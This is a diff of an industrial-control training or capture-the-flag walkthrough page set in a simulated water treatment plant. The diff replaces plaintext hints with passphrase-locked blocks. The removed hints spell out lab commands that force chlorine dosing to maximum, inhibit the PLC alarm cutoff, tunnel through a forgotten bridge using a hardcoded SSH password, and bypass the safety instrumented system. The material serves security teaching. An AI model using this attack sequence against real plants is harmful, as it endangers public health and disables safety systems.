         <li><b>Input Registers (IR)</b> - read-only sensor values</li>
         <li><b>Discrete Inputs</b> - read-only digital inputs</li>
       </ul>
-      <details class="reveal guide"><summary>Scan command?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c scan</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="X2ONYXq4F2K1Q0BzORKBRw==.2SlUELBTN6IvAQ3p.nGWX6fjYsardw12MrCBJO4dyh6eni0MuDFYZJWE7xzsumGclmzEWyuHZXBFQHKDzCpLo7LIptVOTuklXSZA4dWuVpwSPG0WqnvFu3GrnvLEYMuM70m7N8KbPAUZ0QA=="><summary>Scan command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>Study the registers.</b> Which ones control the PID? Which is the mode select? Which sets the dosing speed?</p>
 
       <h3>Step 4: Understand the PID Controller</h3>
@@ -685,24 +621,12 @@ python3 ~/tools/enip-tool.py -t 127.0.0.1 -c write --tag BOOSTER_PUMP_SPEED --va
         <li>Input registers show actual sensor readings</li>
       </ul>
       <p><b>Hint:</b> Look for registers with values like 0 or 1 (mode switches) and values in the 0-100 range (percentages).</p>
-      <details class="reveal guide"><summary>Which registers?</summary><div class="reveal-body">
-        <ul>
-          <li>HR 9 = PID mode (1=AUTO, 0=MANUAL)</li>
-          <li>HR 10 = Manual dosing speed (0-100%)</li>
-          <li>IR 0 = Chlorine sensor reading (x100, so 150 = 1.50 ppm)</li>
-        </ul>
-      </div></details>
+      <details class="reveal guide locked" data-k="pAVInJHjo7vcMbi0+9eLCw==.yHAWECTzrliWSlrb.DuxlZQQTbdGHEw5utosaUuMIRuLeLnwOFP4X5EucIegA5ObCT5YpF+zCh0lcHv6lvt084n81tDWO2TSgVixsNbR6ZXu88xzaUOSlT8zQhHOhfMJTSEHo94F42t02FmPtIeR27LAyUE1393tGYBtpKuSEqbsf1Mxe2qoLSwtbxPBeAksKiM++mZXhcD9sDsePJ4Gk56+1EeSMPM/INvNQCAY1IV+898pzDwSJDYEP2V720sDQuxtIKQRUqBm27lGv9Wn9fzH/82fcy7psZCTyvRR8s7uUwpzproNEKl8IPXhjXilnE9N5JYEZM10="><summary>Which registers? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 5: Take Over</h3>
       <p>Switch the PID to manual and set the dosing speed high.</p>
       <p><b>Watch the HMI</b> - PID should change from AUTO to MANUAL, and chlorine should start rising.</p>
-      <details class="reveal guide"><summary>Commands?</summary><div class="reveal-body">
-        <pre># Switch to manual
-python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 9 --value 0
-
-# Set dosing speed
-python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 10 --value 75</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="TIhoWT7N0LsIS3G0iJOFHg==.CXmKzZdNkmfveLUz.YQrf8kHrGjqFQ8oKs90rxw8WRnHW1h98FAAqMp8gZhQr1xxhvWBq0ne0ZNJbKVZJswB3NjFn+O/OSTDivBeMWQHU8LhtqV1DGNUYeWOADLghY6YQjkUlLkxpvmGhG3qUII1vkgzn42XFJgfDjnm/cLLrVTpi5LLyAhToQNDIDxKQWIUyQTAJp8D5/Haa6gSHRDhowZUXaTt++xPnW4X8yilUW1qfYAUj3SnKhaM6Ohu19ep7ixGhuobxPeFChOGZT9w3zLAYnVegZNEcUFqvZ4TwIfRYxCSWs3/1xX2JyXBz52f6jE6p9RWH/Q=="><summary>Commands? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 6: Observe the Impact</h3>
       <p>Read the chlorine sensor to see it rising:</p>
@@ -745,26 +669,18 @@ python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 10 --value 75</p
       <h3>Step 2: Investigate the Engineering Workstation</h3>
       <p>You have SSH access to the EWS (engineer@10.0.3.20). What else is running on it?</p>
       <p><b>Hint:</b> Check what ports are listening on the EWS.</p>
-      <details class="reveal guide"><summary>How?</summary><div class="reveal-body">
-        <p>SSH to the EWS and list listening ports:</p>
-        <pre>sshpass -p 'eng2024!' ssh -p 2222 engineer@127.0.0.1 'ss -tlnp'</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="kNkNvxu+4Pgv53WF5I0JAg==.PoM7jpSVL56V4clP./a3ZDfE8UcyC+TyLajFbPim7c77cKKicGUWqQK8M1jyU13+XosAUFMQpgu3ihf414YV7Msr8u607Z2mhq8UcCwUmHt+Ev+DPVWzIUJ3oBOerHbzPDj1mRz/ol/kCdaKsGS8Hpxh2b7b4tGui+mWj391NU5v/fM/4pf6bU7KLcMl301jPOYoFsLu0OGfCtYQaqKvaSBOONufU0+blA+2KLIWB"><summary>How? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>What do you see?</b> Port 22 (SSH, expected) and... another port. What's that?</p>
 
       <h3>Step 3: The Forgotten Bridge</h3>
       <p>That mysterious port is a TCP proxy - someone set up a maintenance bridge from the EWS to the Safety PLC. It was supposed to be temporary, but it was never removed.</p>
       <p><b>This is how air-gaps get broken in real facilities.</b></p>
       <p>Tunnel that port to Kali.</p>
-      <details class="reveal guide"><summary>Tunnel command?</summary><div class="reveal-body">
-        <pre>sshpass -p 'eng2024!' ssh -f -N -L &lt;port&gt;:127.0.0.1:&lt;port&gt; -p 2222 engineer@127.0.0.1</pre>
-        <p>Replace <code>&lt;port&gt;</code> with the port you discovered.</p>
-      </div></details>
+      <details class="reveal guide locked" data-k="DMj3D4/TajjarMlOaQJubA==.T2Or5yxScStTOYgY.gqTCpRUd1a6TSzO9wCVIZ4WFbSDyZe13wr34EB0LcATiUfnRshyiUZgy0zmdcHwPOiWJJPf8+GriDo1W5TccTwI5CVtiZAuH8PnT+MdFWy1rVy6OcMBnqaWNkd25/MSDCrfQm2cOIhf+PlQCIoXDWb9vNyJeeMPJfeWmM3Xm0YS1xr2EgNeC5K/mr3dl3uAaR6xLU8YFPQHz+ArojldJ9SCXlWqg4MB7VTPc4t8/kypqI1iuIOm1GnQhQMSJYTvH+KfGeJTH6SkRR9ZqxCSZxcH1DdrerFsUdXDd"><summary>Tunnel command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 4: Scan the Safety PLC</h3>
       <p>The bridge speaks S7comm - the Siemens protocol. S7comm organizes data in <b>Data Blocks (DBs)</b>.</p>
-      <details class="reveal guide"><summary>Scan command?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c scan</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="x3LHZ3qIS2osgPzZqCXNOQ==.PRJCP6oiabfipUaB.oouuetM+b1Ia48iB0Y5iFSfdhxjr/SXi/3D6dt9MywbLb/OhNOe1fQiY0GctEACcaZNKHm9vrLn/o95GZUSOABk7NyIzWFtKRpkPLnrnDP4mXc+n6g1riXEMpyHK+2gp/yTcd8JGhfh8q7G7jYo="><summary>Scan command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>Study the data blocks.</b> Look at the hex dump and decoded values. One DB contains status bits, another has setpoints and something that looks like a password.</p>
 
       <h3>Step 5: Read the Data Blocks</h3>
@@ -777,10 +693,7 @@ python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 10 --value 75</p
         <li>Bit 4: Maintenance Mode (THE TARGET)</li>
       </ul>
       <p><b>DB2</b> contains setpoints and a maintenance password.</p>
-      <details class="reveal guide"><summary>Commands?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c read --db 1 --size 22
-python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c read --db 2 --size 16</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="XwbngLWoRDh/NNrm81/9SQ==.+8WX76bDcDeymQKs.bdGAUfEO0nmCs0yK3HLCRNYw21Qvdm6tdnsuTDGBuZHGkB6qq4VAvO43oDE6BSr6Ppw/OYdA0JEBK+3KH4wedaRjzDv/SGnp9ZlANBYE9ui/bDPtkm8YyrzTYb7KTCVI7++pk6KRJax0sMahiejnJ8+i3Z4jPD3kcN3ZAl+Yi5ICbATOcXrsB5XSzpIUwAmEQh/Wjmuqzp0fzDy+4X8YDRaygTy4GqhNHCUmH76dLTKF+14Vj6QZtPL6jROifFCIa591xHSoPD581UOQ9NaXkYq9Eh0="><summary>Commands? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>Hint:</b> Look at the last value in DB2. Does it look like a numeric code?</p>
 
       <h3>Step 6: Enable Maintenance Mode</h3>
@@ -789,22 +702,12 @@ python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c read --db 2 --siz
         <li>Write the maintenance password to DB2</li>
         <li>Set the maintenance mode bit in DB1</li>
       </ol>
-      <details class="reveal guide"><summary>How?</summary><div class="reveal-body">
-        <p>The tool supports both value writes and single-bit writes:</p>
-        <pre># Write password
-python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c write --db 2 --offset &lt;offset&gt; --value &lt;password&gt;
-
-# Set maintenance bit
-python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c write --db 1 --offset 0 --bit 4 --bit-value on</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="2foYd4XOLAqqV8JQsvcQ/g==.6yppNbp89dhWWc61.RYQykoE/GSoC6AJcCEYt+gOF2/rzb8gtuw4ezgCyIIEr/GfS9irh4dPZbg9J34bTFRVe54uyDPMwS/eKXcU2HCVgMCEGFJ7ceRuA6Ne9WsVnB8Nc9Iuqk7W/z9GkxHadEOd12LKr89KP6fQfvPlf5dTIJ3oMRtO6NnF/wyPXFFr7CaQfqbCRwLYoIQEIJOh5z7fA1w0mEM7riwB7JiOUxOatZsdDo5bZsMTZigpOjY6uOBUfPyS1OMsH0QcWYaH+bECXIQjxJTFe0smAWavGcJzD0QfyEBh5m+LGGSU6dWslCNz89nnHb8glGu0WcoVuS/oZtaIXGasG/GTnupbdnf3+MozkTXnp3tP7EtONlpNPl4J0pEaeW9CeGic6eD0AONJfNh8LE87lEKkta1WhgR5RqMOH5qVUq3wS8MBFxO7Rok42eEUm39weooPDVqMzALUHAHWAsa0UxNit1dTYznJWaledqCUDBfeQDomowyJQYy73Hb4HjmB0M30MbA6jmmSobUpErQ=="><summary>How? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>Watch the HMI</b> - SIS indicator changes from ARMED (green) to BYPASSED (yellow).</p>
 
       <h3>Step 7: Check DB99</h3>
       <p>The scan showed another interesting data block. What's in it?</p>
-      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c read --db 99 --size 32</pre>
-        <p>Look at the ASCII column in the hex dump.</p>
-      </div></details>
+      <details class="reveal guide locked" data-k="wyRVjqnbPvhCZVXnBE8iXQ==.dBQ2nm4gbPOD63On.4Q43jtmv+kcAjEM+YKZCkc7prdbXGeLP7x4fqVd0Y3gLOO8CZ6bPSEj6wm2k6qqQZWN6HHfd52mGmss8J5EAdLpFPrP7vnCh+LjySWf13DsINe3No7aAapmqUIlQh7Sdjm2zqLdWxtgpiB7yZbPJmv38RMSDGngGaHWWpMoIisRXbwo9/axiZU4r80DEcvc2auIak3hoKssVhHMtdsl8EiJ+CYB23w1QIVJWH5fS737rXZ86hp/4VEI="><summary>Command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>What You Learned</h3>
       <ul>
@@ -847,9 +750,7 @@ python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c write --db 1 --of
       <h3>Step 1: Figure Out the PLC Safety Cutoff</h3>
       <p>In CH-08, you set manual mode + high speed. Chlorine rose but stopped at ~5 ppm. Why?</p>
       <p><b>Hint:</b> Go back to the Modbus scan from CH-08. There's a register you didn't use.</p>
-      <details class="reveal guide"><summary>Which register?</summary><div class="reveal-body">
-        <p>HR 15 = alarm_inhibit. When set to 0, the PLC has a hard safety cutoff at 5 ppm. Setting it to 1 disables this cutoff.</p>
-      </div></details>
+      <details class="reveal guide locked" data-k="Rf1f15SFwannFwt8ytOY8A==.R7nbWif9mvP+6dx/.cYq/SJy/761vsj17ojGLvHTOAugWPzb/uwaRztxHCF/5Q8UwMPQCRslUBhKhdZ//ELURyr+W52Ml8u3Z6GnVB5xuyas9ghpB//nJDL/gbw/M7cehDwqfLgo1Eh2hqWG+4MFORVI3S4NVypyX1NawJmHAZ/0CIGBT14GnQFhBR1JbYZiQOZW3mvVmViX+ONMiI0V9qDn1CIMgqYiF6Q=="><summary>Which register? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 2: Plan the Attack</h3>
       <p>You need all three active at once:</p>
@@ -862,19 +763,11 @@ python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p &lt;port&gt; -c write --db 1 --of
       <h3>Step 3: Execute</h3>
       <p>Make sure your tunnels are set up for both Modbus (port 502) and S7comm (port 10102).</p>
       <p><b>Phase 1: Bypass the SIS</b> (if not already done)</p>
-      <details class="reveal guide"><summary>Commands?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p 10102 -c write --db 2 --offset 14 --value 7777
-python3 ~/tools/s7comm-tool.py -t 127.0.0.1 -p 10102 -c write --db 1 --offset 0 --bit 4 --bit-value on</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="QYrEfd1SIWO9xfQlvBgDRA==.1wDEDBPDefOdPd6I.IOkPQkRJkc+SBs9h1SV6gS7yoHRpTSXO7cVYI4QDLwnEPeW3G9QR+57b5S/RQ+tzdMX7sgHKTivwat3P/WQrMdDTjL4ILz2fGrlFFvca6Pi5Hfn+o4dyCh1bnvMBukDDpSU5VwM9o2PXAu/spaq6j8ZaL1uWwJMADDsmXJVZrvBucuUJMt6sAZD9sj/zPNQ6RFU5+wXjis6dtdQt0KQSNaUgWhDWjVzkDTiNAYaFHwUt+WEUR3qSzbwsJfupTcPHQFOs2BcpjMHU1c20M2P7wFqvwPinYBXJ0Ed78FFKE3Gyfhw9pmMzunLjgCSRa74="><summary>Commands? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>Phase 2: Inhibit PLC alarms</b></p>
-      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 15 --value 1</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="o66feaW0ujNQNszYF2BaKQ==.EMm+Cht/jctZoFey.mH5topj1nMCOkOQiKqpN1z0tydL8diDWo9Edl9OWppd2n8NvUII7SbEqNRkRX4Pusf3laisgLQHeIUwBwaermv3KR2gFb8lAzsJtsbJea5wdetZaLc5v4vdGO2g1dpMN5UD0FLgBVfEcDVDbGnrEGPtJsx0XnIo="><summary>Command? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
       <p><b>Phase 3: Maximum chlorine dosing</b></p>
-      <details class="reveal guide"><summary>Commands?</summary><div class="reveal-body">
-        <pre>python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 9 --value 0
-python3 ~/tools/modbus-tool.py -t 127.0.0.1 -c write --register 10 --value 100</pre>
-      </div></details>
+      <details class="reveal guide locked" data-k="ZBe3sNteQDMKSQmjqDuVOA==.8FAnFqSPN7s8QZJo.u10nmNd7HvQgFByA3U7U1D7YBsjP0DkvHwN9pPscOnrhi3Oh1xwo+VY9k0u44QYYB6nePT64BtEpQ/PM5GHD0qZAr8jb7+bWNQRbbkOzrkweKr+OtbKrA7X+WbNrfLg0VnUEjRt8/x8rpTQTfxN/6vRbRLiFiy1tuG64Wsk2EHTZFCy7BXnPsXpgTkTWkW6tOn2LipYatfneIKfSJAr8ebwLzQQgELioAa3nv3JApy7YVAA3rl7goGPXY4qVtlYaZG5hslU="><summary>Commands? <span class="lockpill">locked</span></summary><div class="reveal-body"><form class="pinform" autocomplete="off"><p class="pinlead">This walkthrough is locked. Enter the passphrase given at the event to open it.</p><div class="pinrow"><input type="password" class="pinin" placeholder="passphrase" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="passphrase"><button type="submit" class="pinbtn">Unlock</button></div><p class="pinmsg" role="status"></p></form></div></details>
 
       <h3>Step 4: Watch It Burn</h3>
       <p>Open the HMI Process page. Watch chlorine climb:</p>
@@ -934,5 +827,6 @@ Process (Modbus, DNP3, EtherNet/IP, IEC 104) → Safety (S7comm)</pre>
 </footer>
 
 <script src="../assets/js/site.js"></script>
+<script src="../assets/js/unlock.js"></script>
 </body>
 </html>
